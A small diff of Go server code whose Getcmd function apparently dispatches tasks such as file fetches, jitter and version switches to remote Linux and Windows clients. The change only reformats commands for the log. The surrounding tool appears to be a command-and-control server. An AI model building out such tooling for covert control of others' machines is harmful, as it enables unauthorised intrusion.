@@ -4159,13 +4159,13 @@ func Getcmd(uid, cmd, Taskid,port string) string {
 			!strings.HasPrefix(cmd, "SWITCH_VERSION*//*") &&
 			!strings.HasPrefix(cmd, "GET_U_FILE*//*") &&
 			!strings.HasPrefix(cmd, "GET_JITTER*//*") {
-
+			log_cmd := strings.ReplaceAll(cmd, "*//*", " ")
 			go func(uid string) {
 				clientDataMu.RLock()
 				for i := range client_data.Clients {
 					client := &client_data.Clients[i]
 					if uid == client.Uid {
-						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, cmd)
+						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, log_cmd)
 						logger.WriteLog(log_str)
 						clientDataMu.RUnlock()
 						return
@@ -4176,7 +4176,7 @@ func Getcmd(uid, cmd, Taskid,port string) string {
 				for i := range windows_client_data.Clients {
 					client := &windows_client_data.Clients[i]
 					if uid == client.Uid {
-						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, cmd)
+						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid,  log_cmd)
 						logger.WriteLog(log_str)
 						windows_clientMu.RUnlock()
 						return
